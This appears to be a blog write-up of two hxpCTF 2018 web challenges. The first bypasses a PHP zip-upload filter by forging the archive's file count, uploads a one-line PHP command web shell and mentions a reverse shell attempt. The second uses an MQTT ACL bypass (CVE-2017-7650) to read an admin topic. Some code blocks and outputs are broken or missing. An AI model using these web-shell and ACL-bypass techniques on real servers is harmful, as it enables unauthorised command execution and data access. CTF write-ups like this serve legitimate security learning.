# Description
I could only play hxpCTF during my downtime at Hushcon, but found the challenges extremely fun and engaging. I've split my posts into the crypto challenges and the web challenges. This post is about the web.

Upon visiting the page, we're presented with what's presumed to be the page source.

```php
<?php
if (isset($_FILES['zip']) && $_FILES['zip']['size'] < 10*1024 ){
    $d = 'files/' . bin2hex(random_bytes(32));
    mkdir($d) || die('mkdir');
    chdir($d) || die('chdir');

    $zip = new ZipArchive();
    if ($zip->open($_FILES['zip']['tmp_name']) === TRUE) {
        for ($i = 0; $i < $zip->numFiles; $i++) {
            if(preg_match('/^[a-z]+$/', $zip->getNameIndex($i)) !== 1){
                die(':/ security');
            }
        }

        exec('unzip ' . escapeshellarg($_FILES['zip']['tmp_name']));
        echo $d;
    }
}
else {
    highlight_file(__FILE__);
}
```

From the source code, we see that the page supports zip file uploads. I wonder what that looks like - let's test the upload functionality with an empty zip.

```bash
echo 'test' > ota

zip test.zip ota
    adding: ota (stored 0%)

curl http://195.201.136.29:8087 -F zip=@test.zip
    files/70c4ec668530f636ec753edbc69f3013a64caba935ebbcf496c2d84d3fb47761

curl http://195.201.136.29:8087/files/70c4ec668530f636ec753edbc69f3013a64caba935ebbcf496c2d84d3fb47761/ota
    test
```

Incredible! So the contents of the zip file are uploaded to the server and displayed back to us. The attack vector is clear, we need to display either a php pass-through page for bash or a php reverse shell. We'll try both methods below.

From the source, if we are to upload a `.php` file, we must bypass the regex validation. The code performs a regex match for each file in the zip, where it gets the number of files from `$zip->numFiles`. What if we controlled that number? Let's take a hexdump of the following two zips and see if we can notice where this data is stored.

```bash
cp ota ota2

zip test1.zip ota
    adding: ota (stored 0%)

zip test2.zip ota ota2
    adding: ota (stored 0%)

```

```bash
xxd test1.zip

Right at the end we notice that two values seem unique to each zip; this value represents the number of files in the archive. So if trick the upload code to think that there's only one file, it won't perform a regex check against out php code! Let's give it a shot.

```bash
echo "<?php if(_GET['chai']){ system(_GET['chai']); } ?>" > sh.php

zip ota.zip ota sh.php
    adding: ota (stored 0%)
    adding: sh.php (deflated 22%)

curl http://195.201.136.29:8087 -F zip=@ota.zip
    files/35b3b565956486899c204c899c799747a0d9ab6584d89bcd7b62db6abcdf267c

curl http://195.201.136.29:8087/files/35b3b565956486899c204c899c799747a0d9ab6584d89bcd7b62db6abcdf267c?chai=ls
    ota
    sh.php
```

Perfect! Now we can go get the flag.

```bash
curl http://195.201.136.29:8087/files/35b3b565956486899c204c899c799747a0d9ab6584d89bcd7b62db6abcdf267c/ota.php\?chai\=ls+/

Note: We tried a reverse PHP shell (specifically [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)) and it seems the application won't allow reverse connections (as expexted). See output below.

Upon visiting the challenge, we land on an interesting page:

![landing](https://drtychai.github.io/assets/img/hxp-2018/h4x0rpsch0rr-landing.png)

The first thing we notice is an Admin Access panel in the bottom right corner, but let's take a look at the page's source code first.

```html
<script src="mqtt.min.js"></script>
<script>
  var client = mqtt.connect('ws://' + location.hostname + ':60805')
  client.subscribe('hxp.io/temperature/Munich')

  client.on('message', function (topic, payload) {
    var temp = parseFloat(payload)
    var result = 'NO'

    /* secret formular, please no steal*/
    if (-273.15 <= temp && temp < Infinity) {
      result = 'YES'
    }
    document.getElementById('beer').innerText = result
  })
</script>
```

This seems to be the only interesting part of the code. It appears an MQTT server is running on port 60805, via websockets. The website is using this to determine if the temperature is appropriate for beer (hint: it always it!). I'm not familiar with MQTT, so let's looks up to see what this service does, it's typical uses, and how to connect as a client.

From a quick google search, we see [MQTT](https://en.wikipedia.org/wiki/MQTT) is the standard protocol used for publish-subscribe based messaging, typically used to communicate with IOT devices. This is definitely giving me those internet tingles...let's write a client and play around with this.

Using [paho-mqtt](https://pypi.org/project/paho-mqtt/), we install and dive into the doc. From the client section, we are provided with a functioning client! All we needed to do was edit the transport field in the Client constructor.

```python
#!/usr/bin/env python
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))
    client.subscribe("$SYS/#")

def on_message(client, userdata, msg):
    print(msg.topic+" "+str(msg.payload))

client = mqtt.Client(client_id="", clean_session=True, userdata=None, transport="websockets")
client.on_connect = on_connect
client.on_message = on_message

client.connect("127.0.0.1", 60805, 60)
client.loop_forever()
```

Connecting to the MQTT server and subscribing to `$SYS/#` provides us with the following:

```bash

```

That last one seems awfully interesting - internet tingies, take the wheel! After a dry run, it seems that simple subscribing to `$internal/admin/webcam` didn't work. Let's take a closer look at this specific version, maybe there's a bypass.

Wow! Looks like there is an authentication bypass, see [CVE-2017-7650](https://bugs.eclipse.org/bugs/show_bug.cgi?id=516765). We simple set our `client_id` to an MQTT wildcard (e.g. `#` or `+`) in order to bypass ACL check. Here's our final client.

```python
#!/usr/bin/env python
import sys
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, rc):
    print("Connected with result code "+str(rc))
    #client.subscribe("$SYS/#")
    client.subscribe("$internal/#")

def on_message(client, userdata, msg):
    #print(msg.topic+" "+str(msg.payload))
    with open("mqtt_out",'w+') as f:
        f.write(msg.payload)
        sys.exit()

client = mqtt.Client(client_id="#", clean_session=True, userdata=None, transport="websockets")
client.on_connect = on_connect
client.on_message = on_message

client.connect("195.201.136.29", 60805, 60)
client.loop_forever()
```

Running `file` on the output shows that it's a JPEG file.

This must be for the admin page!

```bash
hxp{Air gap your beers :| - Prost!}
```
